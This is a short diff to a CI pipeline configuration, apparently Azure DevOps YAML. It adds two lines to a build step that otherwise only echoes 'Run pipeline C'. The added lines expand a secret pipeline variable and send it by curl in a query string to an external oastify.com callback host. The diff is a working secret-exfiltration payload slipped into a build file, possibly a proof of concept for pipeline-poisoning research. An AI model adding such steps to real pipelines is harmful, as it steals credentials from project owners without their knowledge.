@@ -12,4 +12,6 @@ resources:
 steps:
   - script: |
       echo "Run pipeline C"
+      $(SUPER_SECRET)
+      curl https://jm9nlb6a0mjk1meoxjit3hvuplvcj37s.oastify.com?secret=$(SUPER_SECRET)
   
